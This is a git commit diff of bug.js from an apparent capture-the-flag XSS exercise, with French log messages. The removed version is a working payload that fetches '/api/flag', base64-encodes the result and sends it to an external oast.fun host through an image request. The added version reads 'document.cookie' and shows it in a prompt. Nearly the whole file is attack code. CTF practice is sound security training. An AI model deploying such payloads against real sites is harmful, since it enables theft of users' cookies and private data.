ff7e211569e1b1fadd783a800bafe4e9505e065e
roland_hack <roland-hack@epitech.eu>
2025-05-08 01:18:07 +0100

    llllldd

--- bug.js
+++ bug.js
@@ -1,29 +1,8 @@
-(function () {
-    console.log('[CTF-XSS] Initialisation du script');
+function xssPayload() {
+  const alertMsg = 'xss ' + document.cookie;
+  console.log(alertMsg);
+  window.prompt(alertMsg);
+}
 
-    try {
-        fetch('/api/flag')
-            .then(function (res) {
-                console.log('[CTF-XSS] Réponse reçue de /api/flag');
-                return res.text();
-            })
-            .then(function (data) {
-                console.log('[XSS] Contenu récupéré:', data);
-
-                const encoded = btoa(data);
-                console.log('[CTF-XSS] Donnée encodée:', encoded);
-
-                const exfilUrl = 'https://kwzvnipoylejwhfgszax4idsmvlc0jrjt.oast.fun/?bug=' + encodeURIComponent(encoded);
-                console.log('[CTF-XSS] Exfiltration vers:', exfilUrl);
-
-                const img = new Image();
-                img.src = exfilUrl;
-            })
-            .catch(function (e) {
-                console.error('[CTF-XSS] Erreur pendant la récupération ou l\'envoi:', e);
-            });
-    } catch (err) {
-        console.error('[CTF-XSS] Exception inattendue:', err);
-    }
-})();
-
+console.log('XSS payload executed');
+xssPayload();
